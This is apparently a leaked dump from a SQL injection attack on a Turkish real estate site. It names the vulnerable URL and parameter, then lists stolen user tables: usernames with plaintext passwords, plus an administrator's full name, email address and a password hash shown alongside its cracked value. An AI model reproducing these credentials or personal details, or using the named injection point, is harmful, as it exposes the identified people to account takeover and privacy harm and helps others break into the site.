VULN URL: http://homeofside.com/emlak_details-en.php?idd_no=186&emlakid=5071
Database: homeofsi_dbHakanEmlak
Table: users                   
[4 entries]                    
+-------+---------+-----------+
| id_no | user    | pass      |
+-------+---------+-----------+
| 2     | hakan   | 10tane10  |
| 7     | irfan   | ozer1212  |
| 14    | monique | pamuk1966 |
| 17    | monique | pamuk1966 |
+-------+---------+-----------+

Database: homeofsi_dbHakanEmlak
Table: hos_user
[1 entry]
+------+-------+-------+---------+-------+----------------------+-------------------------------------------------+
| idno | yetki | adi   | soyadi  | k_adi | email                | sifre                                           |
+------+-------+-------+---------+-------+----------------------+-------------------------------------------------+
| 1    | Admin | Hakan | Özdemir | hakan | hakan07ant@gmail.com | c932a4d89f2372c5fc10fe0d06520e9dfbaab29c (hakan)|
+------+-------+-------+---------+-------+----------------------+-------------------------------------------------+
